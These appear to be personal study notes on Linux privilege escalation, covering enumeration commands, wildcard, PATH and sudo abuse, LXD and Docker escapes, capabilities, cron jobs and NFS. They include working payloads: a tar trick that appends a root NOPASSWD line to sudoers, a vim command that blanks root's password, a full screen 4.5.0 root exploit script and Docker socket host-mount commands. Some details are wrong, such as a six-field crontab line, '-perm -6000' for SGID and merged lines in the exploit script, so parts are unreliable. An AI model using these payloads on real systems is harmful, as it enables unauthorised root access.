
## Environment Enumeration


## Linux Services & Internals Enumeration

### Network Interfaces
```shell
ip a

ifconfig

ipconfig
```
### Hosts
```shell
cat /etc/hosts
```

### User's Last Login
```shell
lastlog
```

### Logged In Users
```shell
w

who

finger
```

### Command History
```shell
history

find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

### Proc
the proc file system contains information about running processes, kernel params, system memory, etc...
the below command finds the `cmdline` file for the process which holds the command used to start the process and prints the output.
```shell
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

or you can use `ps`

```shell
ps fauxwww
```
### Services
we might find outdated packages that we can use to escalate privileges. First we need to create a list of installed packages.
```shell
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

### Sudo version
the sudo version might be outdated and contain CVEs (dirtycow)
```shell
sudo -v
```

### Trace System Calls
if you've found a binary on a host, you can view it's system calls using strace
```shell
strace <COMMAND>
```

### Configuration Files and scripts
```shell
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

```shell
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

### Running Services
```shell
ps aux
```

## Environment Based Privilege Escalation
### Path Abuse
the $PATH variable in Linux is used by the system to determine the location of the binary used in the command,
```shell
which whoami

/usr/bin/whoami
```
see that the `whoami` binary is present in `/usr/bin/` and that location must be present in the $PATH variable so that the system searches for the binary `whoami` in it
```shell
/tmp:/usr/local/bin:/home/vulner/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/bin
```
we can see that `/usr/bin` is indeed in the $PATH variable. If there is a directory present in the $PATH variable that we have write access to, we can hijack a binary and escalate privileges. We have write access to the `/tmp` directory and it comes before `/usr/bin`, so we can write a bash script named `whoami` in the `/tmp` directory and it will execute.
>[!note]
>This technique is often used when we have sudo access to a binary without a specified path.

---
### Wildcard Abuse
A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

| **Character** | **Significance**                                                                                                                                      |     |
| ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- | --- |
| `*`           | An asterisk that can match any number of characters in a file name.                                                                                   |     |
| `?`           | Matches a single character.                                                                                                                           |     |
| `[ ]`         | Brackets enclose characters and can match any single one at the defined position.                                                                     |     |
| `~`           | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |     |
| `-`           | A hyphen within brackets will denote a range of characters.                                                                                           |     |

Argument injection attacks are a good example of wildcard abuse. The `tar` archive utility has two arguments we are interested in
```shell
man tar 

<SNIP> 
Informative output 
--checkpoint[=N] 
Display progress messages every Nth record (default 10). 

--checkpoint-action=ACTION 
Run ACTION on each checkpoint.
```

if it happens that there is a cronjob like
```shell
mh dom mon dow command 
*/01 * * * * cd /home/ahmed && tar -zcf /home/ahmed/backup.tar.gz *
```

or we have sudo privileges on the tar command
```shell
sudo -l

(ALL : ALL) /usr/bin/tar *
```

we can see we have a wildcard `*` which means any character, so we can create two files named as the arguments
```shell
echo 'echo "ahmed ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

echo "" > "--checkpoint-action=exec=sh root.sh"

echo "" > '--checkpoint=1'
```

- first line: write the payload into the `root.sh` file, the payload basically grants us root privileges
- second line: create a file named `--checkpoint-action=exec=sh root.sh`
- third line: create a file named `--checkpoint=1`

when the cronjob runs, the command will be as follows
```shell
cd /home/ahmed && tar -zcf /home/ahmed/backup.tar.gz --checkpoint-action=exec=sh root.sh --checkpoint=1 #rest of files
```

---
### Escaping Restricted Shells
A restricted shell is a type of shell that limits the user's ability to execute commands. There are Three popular types of restricted shells:
- [Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (`rbash`)
- [Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (`rksh`)
- [Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (`rzsh`)

Another resource to check is [0xffsec Blog](https://0xffsec.com/handbook/shells/restricted-shells/) which covers a couple of interesting ways to escape these shells
#### Command Injection
In case we can execute a specific command like `ls`, we can use the inline command operator "\`" known as the backtick.
```shell
ls -l `pwd`
```

#### Command Substitution
Command substitution operators like ( `$(CMD)` or `{CMD}`  or \`CMD\` ) are all can be abused to escape the restricted shell. If that shell allow us to execute commands using these operators.
```shell
echo "$(<flag.txt )"
```
that's a clever way of reading files
#### Command Chaining
Using command separators such as ( `;` or `|` or `&&` ) we can chain a command we can execute with another command that is forbidden
```shell
ls -al ; cat /etc/passwd
```

---
#### Environment Variables
If there is an environment variable that points to a directory, and one of the commands uses that env var, we can change it's value to another directory

---
#### Shell Functions
We can abuse shell functions to execute commands indirectly. If there is a command we can't execute, we can write a shell function which executes the desired command and call that function.

## Permission Based Privilege Escalation
------
### Special Permissions
There are two main special permissions, `SUID` or set-userid and `SGID` or set-groupid. `SUID` means you can execute the script/binary with the privileges of the creator user, `SGID` is the same as `SUID` but with groups, so you will execute a script/binary with the permissions of the creator group.

After enumerating files with `SUID` or `SGID` bits set, we can search for a way to exploit them on [GTFOBins.org](https://gtfobins.org/)

search for binaries with SUID bit set
```shell
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

search for binaries with SGID bit set
```shell
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```


---
### Sudo Rights Abuse
We can check our sudo rights using the command `sudo -l`, here is an example
```shell
sudo -l

(root) NOPASSWD: /usr/sbin/tcpdump
```
the output means we can run `/usr/sbin/tcpdump` with sudo privileges. We can go back to [GTFOBins.org](https://gtfobins.org/) and check how we can abuse this binary, if the binary is stated without a path like `tcpdump` we can do a path abuse attack.

[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing command execution. Two best practices that should always be considered when provisioning `sudo` rights:

|     |                                                                                                                                                                                                                                                                                                                                |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1.  | Always specify the absolute path to any binaries listed in the `sudoers` file entry. Otherwise, an attacker may be able to leverage PATH abuse to create a malicious binary that will be executed when the command runs (i.e., if the `sudoers` entry specifies `cat` instead of `/bin/cat` this could likely be abused).      |
| 2.  | Grant `sudo` rights sparingly and based on the principle of least privilege. Does the user need full `sudo` rights? Can they still perform their job with one or two entries in the `sudoers` file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation. |


### Privileged Groups
---
#### LXC / LXD
LXC is an operating system-level virtualization technique, and we can use it's group membership to escalate privileges by creating a privileged container and accessing the host file system at `/mnt/root`.

Unzip the image.
```shell
unzip alpine.zip
```

Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.
```shell
lxd init
```

Import the local image.
```shell
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

list images
```shell
lxc image list
```

Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
```shell
lxc init alpine r00t -c security.privileged=true
```

Mount the host file system.
```shell
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

start a shell
```shell
lxc start r00t

lxc exec r00t /bin/bash
```

We can now browse the host file system through `/mnt/root`, so to access the root directory we want to go to `/mnt/root/root`.

---
#### Docker
If we have the docker group membership than we can simply create a docker container with the desired directory mounted to it, we can then access that directory.

mount the root directory to the container
```shell
docker run -v /root:/mnt -it <CONTAINER_ALIAS>
```

---
#### Disk
Disk group membership grants us full access to any devices contained within `/dev`, such as `/dev/sda1`. We can use these privileges with the `debugfs` utility to access the entire file system with the root privileges.

---
#### ADM
This group grants us read access to all log files under `/var/log`, we can search these log files for any sensitive information.

search for a string in the logs
```shell
grep -rni "password"
```

### Capabilities
Capabilities are the special permissions for processes, like SUID and SGID for users and groups. We can set a capability to a binary like
```shell
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

The following table showcases some capabilities and their function

| **Capability**         | **Description**                                                                                                                                           |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_sys_admin`        | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.                                     |
| `cap_sys_chroot`       | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.            |
| `cap_sys_ptrace`       | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| `cap_sys_nice`         | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.               |
| `cap_sys_time`         | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.                |
| `cap_sys_resource`     | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.       |
| `cap_sys_module`       | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.      |
| `cap_net_bind_service` | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.                         |

When setting a cap for an executable we'll use one of the following values

| **Capability Values** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                               |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`                   | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.                                                                                                                                                                                                                                        |
| `+ep`                 | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.                                                                                                                                                    |
| `+ei`                 | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.                                                                                                                                    |
| `+p`                  | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |

We can use the following caps to escalate privileges

| Capability         | Privilege Escalation scenario                                                                                                                                                                                                |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks. Thus we can change the passwd file and remove the root user password                                                                                    |

enumerate capabilities
```shell
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```

Let's say we found the capability `cap_dac_override=eip` on `/usr/bin/vim.basic`, we can open the /etc/passwd file and remove the root password

remove the root password non-interactivally
```shell
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

>[!note]
>We don't actually REMOVE the root password, we just remove the "x" in the second column in the root user row in passwd. Which means the password is empty. After we finish the engagement we can write the "x" back and it'll work just fine

## Service Based Privilege Escalation

### Vulnerable Services
Alot of services have PE vulnerabilities, and one of them is the terminal multiplexer [Screen](https://linux.die.net/man/1/screen). Version 4.5.0 has a PE vulnerability due to a lack of permissions when opening a log file which allows and attacker to truncate or create a file owned by root in any directory. The following is a script used to abuse this vulnerability

```bash
#!/bin/bash 
# screenroot.sh 
# setuid screen v4.5.0 local root exploit 
# abuses ld.so.preload overwriting to get root. 
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html 
# HACK THE PLANET 
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~" 
echo "[+] First, we create our shell and library..." 
cat << EOF > /tmp/libhax.c 
	#include <stdio.h> 
	#include <sys/types.h> 
	#include <unistd.h> 
	#include <sys/stat.h> 
	__attribute__ ((__constructor__)) void dropshell(void){ 
	chown("/tmp/rootshell", 0, 0); 
	chmod("/tmp/rootshell", 04755); 
	unlink("/etc/ld.so.preload"); 
	printf("[+] done!\n"); 
} 
EOF 
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c 
rm -f /tmp/libhax.c 
cat << EOF > /tmp/rootshell.c 
	#include <stdio.h> 
	int main(void){ 
	setuid(0); 
	setgid(0); 
	seteuid(0); 
	setegid(0); 
	execvp("/bin/sh", NULL, NULL); 
} 
EOF 
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration 
rm -f /tmp/rootshell.c 
echo "[+] Now we create our /etc/ld.so.preload file..." 
cd /etc umask 000 # because 
screen -D -m -L ld.so.preload 
echo -ne "\x0a/tmp/libhax.so" # newline needed 
echo "[+] Triggering..." screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

### Cron Job Abuse
Cron jobs are timers the system use to know when to execute a script. We can create a cron file with the `crontab` command, and that file will be placed inside `/var/spool/cron` and sometimes applications create cron files at `/etc/cron.d`. Each crontab entry requires six items in the following order: minutes, hours, days, months, weeks, commands

crontab entry to run `backup.sh` every two hours
```shell
0 */2 * * * /home/admin/backup.sh
```

crontab entry to run `backup.sh` every two minutes
```shell
0 */2 * * * * /home/admin/backup.sh
```

if we can write to the crontab file, then we can make it run our PE script. however, if we can't write to the crontab file but we can modify the script it runs, then we can add a command like `chmod +s /bin/bash` in case the cron job user is root.

We can use `pspy` to view running processes - which works by viewing procfs - and compare the time of command execution
```shell
./pspy64 -pf -i 1000
```

#### incron
`incron` is like `cronjob` but instead of timing commands, commands are executed on filesystem changes. here is a sample from the HTB connected machine
```shell
cat /etc/incron.d/*

/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

in the above output, when you write to `dahdi_restart` then close, the `sysadmin_dahdi_restart` command will run. If you can write to `sysadmin_dahdi_restart` and it's owned by root than this is an easy PE. If you can't however, you should search for a config file or a script that is used in the `sysadmin_dahdi_restart` command.
### Containers

#### LXC / LXD
These are mentioned [[Linux Privilege Escalation#LXC / LXD|above]]

#### Docker

##### Docker Shared Directories
When inside a docker container, we might find shared directories or volume mounts with the host system which would allow us to access directories from the host system while inside the container

##### Docker Sockets
If we found a `docker.socket` file inside a container, we can use it to gather more information about the environment

download the [docker](https://master.dockerproject.com/linux/x86_64/docker) binary to interact with the socket
```shell
wget http://<IP>/docker -O docker
```

view docker containers
```shell
docker -H unix://<FULL_PATH_TO_DOCKER_SOCKET> ps
```

create a container that maps the host's root directory to the hostsystem directory on the container using the image found above
```shell
docker -H unix://<FULL_PATH_TO_DOCKER_SOCKET> run --rm -d --privileged -v /:/hostsystem <IMAGE_NAME>
```

check for the new container
```shell
docker -H unix://<FULL_PATH_TO_DOCKER_SOCKET> ps
```

login to the new privileged container
```shell
docker -H unix://<FULL_PATH_TO_DOCKER_SOCKET> -it <CONTAINER_ID> /bin/bash
```

If we are part of the `docker` group on a host system, we can check for the socket file at `/var/run/docker.sock`, this file is only writable by the `root` and `docker` groups. We can escalate our privileges with the following commands

check present images
```shell
docker image ls
```

abuse the socket and escalate privileges
```shell
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt bash
```


### Miscellaneous Techniques

#### Passive Traffic Capture
we can use `tcpdump` to view the network traffic and search for cleartext credentials. Other tools include [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz). We can also use [[Attacking Active Directory#LLMNR/NBT-NS Poisoning|Responder]] to start a LLMNR/NBT-NS Poisoning attack and capture NTLMv2 hashes 

#### Weak NFS Privileges
Check my notes on [[Host Based Enumeration#NFS|Host Based Enumeration]] to learn more about NFS

When an NFS volume is created, various options can be set:

| Option           | Description                                                                                                                                                                                                                                                                                   |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `root_squash`    | If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set. |
| `no_root_squash` | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.                                                                           |

check NFS settings 
```shell
cat /etc/exports
```

we can create a malicious script that executes `/bin/bash` and set the SUID bit, so when the low privileged user execute it, it will run `/bin/bash` as the `root` user.

```shell

```